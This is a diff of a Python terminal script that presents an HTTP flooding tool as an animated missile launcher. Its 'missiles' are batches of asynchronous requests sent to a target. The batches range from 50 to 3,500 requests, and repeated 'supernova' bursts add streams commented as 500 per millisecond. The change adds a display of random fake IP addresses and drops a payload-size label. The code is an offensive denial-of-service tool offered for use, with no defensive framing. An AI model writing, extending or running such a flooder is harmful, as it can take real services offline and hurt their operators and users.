@@ -14,11 +14,17 @@ TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2
 def clear():
     print("\033[H\033[J", end="")
 
-# Countdown loader
+# Generate random real-looking IPv4
+def random_ip():
+    return ".".join(str(random.randint(1, 255)) for _ in range(4))
+
+# Countdown loader with random IPs
 async def countdown_loader(seconds):
     for i in range(seconds, 0, -1):
         clear()
         print(f"SG - RELOADING | {i}s")
+        for _ in range(5):
+            print(random_ip())
         await asyncio.sleep(1)
 
 # Small missile body
@@ -38,18 +44,14 @@ EXHAUST_FRAMES = [
     "\033[93m ::: \033[0m"
 ]
 
-# Payload
-PAYLOAD_KB = 254 * 5  # 1270 KB
-PAYLOAD_MB = PAYLOAD_KB / 1024  # ~1.24 MB
-PAYLOAD_DISPLAY = f"{PAYLOAD_KB} KB | {PAYLOAD_MB:.2f} MB"
-
-# Missile batches
+# Missile types: speed -> request batch
 MISSILE_BATCHES = {
     1: 50,
     2: 200,
     3: 300,
     4: 1000
 }
+
 ULTRA_SUPER_BATCH = 3500
 LAST_BATCH = 500
 SUPERNOVA_INITIAL = 1000
@@ -78,7 +80,7 @@ class Missile:
                 self.reset()
                 self.active = False
 
-# Draw missiles with batch and payload
+# Draw missiles with only number of requests
 def draw_missiles(missiles):
     buffer = [""] * TERMINAL_HEIGHT
     for missile in missiles:
@@ -87,7 +89,7 @@ def draw_missiles(missiles):
                 pos = missile.y - len(MISSILE_BODY) + i
                 if 0 <= pos < TERMINAL_HEIGHT:
                     if i == 0:
-                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}] | Data: {PAYLOAD_DISPLAY}"
+                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
                     else:
                         buffer[pos] += " " * missile.x + line
             exhaust_pos = missile.y
@@ -96,7 +98,7 @@ def draw_missiles(missiles):
     clear()
     print("\n".join(buffer))
 
-# Send requests
+# Send batch requests
 async def send_requests(target, batch):
     async with aiohttp.ClientSession() as session:
         tasks = []
@@ -121,15 +123,17 @@ async def last_missile(target, duration):
         asyncio.create_task(send_requests(target, LAST_BATCH))
         await asyncio.sleep(0.5)
 
-# Supernova missile every 5-10s
+# Supernova missile
 async def supernova_missile(target, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
         delay = random.uniform(5, 10)
         await asyncio.sleep(delay)
+
+        # Initial 1000 requests
         asyncio.create_task(send_requests(target, SUPERNOVA_INITIAL))
 
-        # stream while rising
+        # Stream of 500/ms while rising (~2s flight)
         async def stream():
             t_end = time.time() + 2
             while time.time() < t_end:
